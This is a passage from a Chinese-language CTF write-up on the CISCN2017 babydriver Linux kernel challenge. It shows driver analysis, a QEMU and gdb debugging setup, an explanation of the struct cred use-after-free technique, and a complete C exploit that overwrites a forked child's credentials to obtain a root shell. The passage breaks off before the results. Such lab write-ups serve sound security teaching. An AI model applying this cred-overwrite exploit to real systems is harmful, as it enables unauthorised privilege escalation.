@@ -1,0 +1,207 @@
+        return -1LL;
+      result = -2LL;
+      if ( babydev_struct.device_buf_len > length )
+      {
+        copy_from_user(babydev_struct.device_buf, buffer, length);
+        result = length;
+      }
+      return result;
+    }
+**7) babyioctl**
+babyioctl 函数的功能类似于 `realloc`：将原先的 device_buf 释放，并分配一块新的内存。
+但这里有个很重要的点需要注意： **该位置的 kmalloc 大小可以被用户任意指定** ，而不是先前 babyopen 中的 64。
+**e. 获取到的信息**
+根据上面的分析，最终我们可以得到以下信息：
+已开启的保护：
+  * nx
+  * smep
+内核模块中可能能利用的点：
+  * babyrelease **释放 device_buf 指针后没有置空，device_buf_len 没有重置为0**
+  * babyioctl 可以让 device_buf 重新分配 **任意大小** 的内存
+  * 当前内核模块中 **所有用到的变量都是全局变量** ，这意味着 **并发性非常的脆弱** ，或许可以利用一下。
+###  4\. 调试前的准备
+  * 编写以下 shell 脚本以快速启动调试会话 
+        #!/bin/bash
+    # 判断当前权限是否为 root，需要高权限以执行 gef-remote --qemu-mode
+    user=$(env | grep "^USER" | cut -d "=" -f 2)
+    if [ "$user" != "root"  ]
+      then
+        echo "请使用 root 权限执行"
+        exit
+    fi
+    # 静态编译 exp
+    gcc exp.c -static -o rootfs/exp
+    # rootfs 打包
+    pushd rootfs
+    find . | cpio -o --format=newc > ../rootfs.cpio
+    popd
+    # 启动 gdb
+    gnome-terminal -e 'gdb -x mygdbinit'
+    # 启动 qemu
+    qemu-system-x86_64 \
+        -initrd rootfs.cpio \
+        -kernel bzImage \
+        -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
+        -enable-kvm \
+        -monitor /dev/null \
+        -m 64M \
+        --nographic  \
+        -smp cores=1,threads=1 \
+        -cpu kvm64,+smep \
+        -s
+> exploit 需要静态编译，因为 kernel 不提供标准库，但一定提供 syscall。
+  * 获取 vmlinux我们可以使用 [extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) 工具，从 bzImage 中解压出 vmlinux。  
+> 直接让 gdb 加载 bzImage 时将无法加载到任何 kernel 符号，
+>
+> 因此需要先从 bzImage 中解压出 vmlinux， 再来让 gdb 加载符号。
+        wget https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux
+    chmod +x ./extract-vmlinux
+    cd CISCN2017-babydriver/babydriver/
+    ../../extract-vmlinux bzImage > vmlinux
+但实际上，解压出来的 vmlinux 的函数名称全部为 `sub_xxxx`，不方便调试。即便所有的内核符号与函数名称的信息全部位于内核符号表中（或者
+`/proc/kallsyms`），但一个个对应过去也相当麻烦。
+因此还有一个工具可以使用：`vmlinux-to-elf`
+> 使用这个工具之前系统中必须装有 **高于3.5** 版本的python
+        sudo apt install python3-pip
+    sudo pip3 install --upgrade lz4 git+https://github.com/marin-m/vmlinux-to-elf
+使用方式：
+        # vmlinux-to-elf  
+    vmlinux-to-elf bzImage vmlinux
+之后解压出来的 vmlinux 就是带符号的，可以正常被 gdb 读取和下断点。
+  * 查看当前 bzImage 所对应的内核版本，并下载该版本的内核代码（如果有需要，想更细致的研究内核的话） 
+        $ strings bzImage | grep "gcc" # 或者 `file bzImage` 命令
+    4.4.72 (atum[@ubuntu](https://github.com/ubuntu "@ubuntu")) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #1 SMP Thu Jun 15 19:52:50 PDT 2017
+    $ curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-4.4.72.tar.xz
+    $ unxz linux-4.4.72.tar.xz
+    $ tar -xf linux-4.4.72.tar
+  * 启动 kernel 后，别忘记在 gdb 中使用 `add-symbol-file` 加载 ko 的符号： 
+        # in kernel shell:
+    / $ lsmod
+    babydriver 16384 0 - Live 0xffffffffc0000000 (OE)
+    # in gdb:
+    gef➤  add-symbol-file babydriver.ko 0xffffffffc0000000
+  * 最终设置的 mygdbinit 如下 
+        set architecture i386:x86-64
+    add-symbol-file vmlinux
+    gef-remote --qemu-mode localhost:1234
+    c
+    # 先 continue， 在 insmod 之后手动 Ctrl+C 再设置断点，免得断点处于 pending 状态
+    add-symbol-file babydriver.ko 0xffffffffc0000000
+    b babyread
+    b babywrite
+    b babyioctl
+    b babyopen
+    b babyrelease
+    c
+###  5\. kernel 的 UAF 利用
+**a. 覆写 cred 结构体**
+UAF 的常规利用是通过悬垂指针来修改某块特定内存上的数据，因此在这里我们可以试着：
+  * 先让一个悬垂指针指向一块已被释放的内存
+  * 执行 fork 操作，使 fork 时给新子进程分配的 `struct cred` 结构体重新分配这块内存
+  * 利用悬垂指针来随意修改这块内存上的 `struct cred` 结构体，达到提权的效果
+`struct cred` 结构体用于 **保存每个进程的权限** ，其结构如下所示：
+    /*
+     * The security context of a task
+     *
+     * The parts of the context break down into two categories:
+     *
+     *  (1) The objective context of a task.  These parts are used when some other
+     *  task is attempting to affect this one.
+     *
+     *  (2) The subjective context.  These details are used when the task is acting
+     *  upon another object, be that a file, a task, a key or whatever.
+     *
+     * Note that some members of this structure belong to both categories - the
+     * LSM security pointer for instance.
+     *
+     * A task has two security pointers.  task->real_cred points to the objective
+     * context that defines that task's actual details.  The objective part of this
+     * context is used whenever that task is acted upon.
+     *
+     * task->cred points to the subjective context that defines the details of how
+     * that task is going to act upon another object.  This may be overridden
+     * temporarily to point to another security context, but normally points to the
+     * same context as task->real_cred.
+     */
+    struct cred {
+      atomic_t  usage;
+    #ifdef CONFIG_DEBUG_CREDENTIALS
+      atomic_t  subscribers;  /* number of processes subscribed */
+      void    *put_addr;
+      unsigned  magic;
+    #define CRED_MAGIC  0x43736564
+    #define CRED_MAGIC_DEAD  0x44656144
+    #endif
+      kuid_t    uid;    /* real UID of the task */
+      kgid_t    gid;    /* real GID of the task */
+      kuid_t    suid;    /* saved UID of the task */
+      kgid_t    sgid;    /* saved GID of the task */
+      kuid_t    euid;    /* effective UID of the task */
+      kgid_t    egid;    /* effective GID of the task */
+      kuid_t    fsuid;    /* UID for VFS ops */
+      kgid_t    fsgid;    /* GID for VFS ops */
+      unsigned  securebits;  /* SUID-less security management */
+      kernel_cap_t  cap_inheritable; /* caps our children can inherit */
+      kernel_cap_t  cap_permitted;  /* caps we're permitted */
+      kernel_cap_t  cap_effective;  /* caps we can actually use */
+      kernel_cap_t  cap_bset;  /* capability bounding set */
+      kernel_cap_t  cap_ambient;  /* Ambient capability set */
+    #ifdef CONFIG_KEYS
+      unsigned char  jit_keyring;  /* default keyring to attach requested
+               * keys to */
+      struct key __rcu *session_keyring; /* keyring inherited over fork */
+      struct key  *process_keyring; /* keyring private to this process */
+      struct key  *thread_keyring; /* keyring private to this thread */
+      struct key  *request_key_auth; /* assumed request_key authority */
+    #endif
+    #ifdef CONFIG_SECURITY
+      void    *security;  /* subjective LSM security */
+    #endif
+      struct user_struct *user;  /* real user ID subscription */
+      struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
+      struct group_info *group_info;  /* supplementary groups for euid/fsgid */
+      struct rcu_head  rcu;    /* RCU deletion hook */
+    };
+新进程的 `struct cred` 结构体分配的代码位于 `_do_fork -> copy_process -> copy_creds ->
+prepare_creds` 函数调用链中。
+为了避开繁琐的内存分配利用，精简利用方式，我们只需要让 babydriver 中释放的 `device_buf` 内存的大小与 `sizeof(struct
+cred)`一致即可，这样便可以让内核在为 struct cred 分配内存时，分配到刚释放不久的 device_buf 内存。
+由于当前 bzImage 解压出来的 vmlinux 没有 **结构体** 符号，因此我们可以直接根据默认参数编译出一个新的 vmlinux，并加载该
+vmlinux 来获取 `struct cred` 结构体的大小：
+    gef➤  p sizeof(struct cred)
+    $1 = 0xa8
+执行完 `babyrelease`
+函数之后，`device_buf`就会成为悬垂指针。但需要注意的是，在用户进程空间中，当执行`close(fd)`之后，该进程将无法再使用这个文件描述符，因此没有办法在`close`后再利用这个
+fd 去进行写操作。
+但我们可以利用 babydriver 中的 **变量全是全局变量** 的这个特性，同时执行两次 open 操作，获取两个 fd。这样即便一个 fd 被
+close 了，我们仍然可以利用另一个 fd 来对 `device_buf` 进行写操作。
+这样一套完整的利用流程就出来了，exploit 如下所示：
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    int main() {
+        int fd1 = open("/dev/babydev", O_RDWR); // alloc
+        int fd2 = open("/dev/babydev", O_RDWR); // alloc
+        ioctl(fd1, 65537, 0xa8);    // realloc
+        close(fd1); // free
+        if (!fork()) {
+            // child
+            // try to overwrite struct cred
+            char mem[4 * 7]; // usage uid gid suid sgid euid egid
+            memset(mem, '\x00', sizeof(mem));
+            write(fd2, mem, sizeof(mem));
+            // get shell
+            printf("[+] after LPE, privilege: %s\n", (getuid() ? "user" : "root"));
+            system("/bin/sh");
+        }
+        else
+            // parent
+            waitpid(-1, NULL, 0);
+        return 0;
+    }
+> 需要注意的是，当进程执行完 fork 操作后，父进程必须 wait 子进程，否则当父进程被销毁后，该进程成为孤儿进程，将无法使用终端进行输入输出。
+利用结果：
